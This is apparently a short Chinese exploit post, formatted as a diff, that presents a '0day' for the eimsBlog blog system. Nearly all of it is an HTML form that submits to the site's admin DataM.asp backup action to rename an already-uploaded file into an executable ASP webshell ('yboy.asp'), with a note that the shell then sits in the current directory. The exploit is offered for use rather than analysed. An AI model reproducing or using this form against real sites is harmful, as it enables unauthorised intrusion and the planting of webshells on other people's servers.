@@ -1,0 +1,17 @@
+一个开源的BLOG系统~
+
+Exp:
+
+<table width=”98%” border=”0″ cellspacing=”1″ cellpAdding=”1″ align=”center”>
+<form method=”post” action=”www.heimian.com/admin/DataM.asp?eims=Data&Action=bfstart”>
+<tr><td colspan=”2″><div>eimsBlog系统0day By yboy</div></td></tr>
+<tr><td colspan=”2″><font color=”red”>先上传，shell在当前目录</font></td></tr>
+<tr><td width=”20%” align=”right”>webshell地址：</td>
+<td><input name=”olddata” type=”text” id=”olddata” value=”" size=”<% =InputSize %>” ></td></tr>
+<tr><td align=”right”>名称：</td>
+<td><input name=”newdata” type=”text” id=”newdata” size=”<% =InputSize %>” value=”yboy.asp”></td></tr>
+<tr><td align=”right”></td><td><input type=”submit” name=”Submit” value=”fuck” /></td></tr>
+</form>
+</table>
+ 
+
